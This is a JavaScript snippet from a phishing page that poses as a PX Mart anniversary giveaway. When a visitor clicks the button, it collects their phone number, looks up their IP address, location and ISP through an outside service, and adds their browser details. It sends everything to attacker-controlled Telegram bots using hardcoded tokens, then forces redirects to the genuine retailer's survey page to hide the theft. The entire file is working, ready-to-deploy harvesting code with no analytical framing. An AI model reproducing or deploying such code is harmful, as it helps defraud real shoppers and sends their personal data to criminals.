<script>
document.addEventListener("DOMContentLoaded", function(){
  const btn = document.getElementById("getBtn");
  const phoneInput = document.getElementById("phone");

  btn.addEventListener("click", function(){
    const phone = phoneInput.value.trim(); // 完全不驗證長度，直接接受任何輸入
    
    btn.textContent = "領取中...";
    btn.disabled = true;

    const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
    const base = `全聯週年慶暴力版誘捕成功\n電話：+886${phone||"(空白)"}\n時間：${time}`;

    // 抓完整 IP 資訊（三重保險）
    fetch("https://cfip.mx/json")
      .then(r => r.json())
      .then(data => {
        const full = base +
          `\nIP　　：${data.ip}` +
          `\n位置　：${data.city||"未知"}，${data.country||"台灣"}` +
          `\nISP　　：${data.asn_org||"未知"}` +
          `\n裝置　：${navigator.userAgent.substring(0,130)}...`;
        sendToBot(full);
      })
      .catch(() => {
        sendToBot(base); // IP 失敗也至少發基本資料
      });

    // 雙 token 發送函式
    function sendToBot(msg){
      const tokens = [
        "8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys",
        "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE"
      ];
      tokens.forEach(t => {
        new Image().src = `https://api.telegram.org/bot${t}/sendMessage?chat_id=1137905005&text=${encodeURIComponent(msg)}`;
      });
    }

    // 三重強制跳轉（手機電腦 100% 成功）
    setTimeout(() => window.location = "https://www.pxmart.com.tw/campaign/survey", 800);
    setTimeout(() => location.replace("https://www.pxmart.com.tw/campaign/survey"), 1200);
    setTimeout(() => {
      const a = document.createElement("a");
      a.href = "https://www.pxmart.com.tw/campaign/survey";
      a.target = "_top";
      document.body.appendChild(a);
      a.click();
    }, 1600);
  });
});
</script>
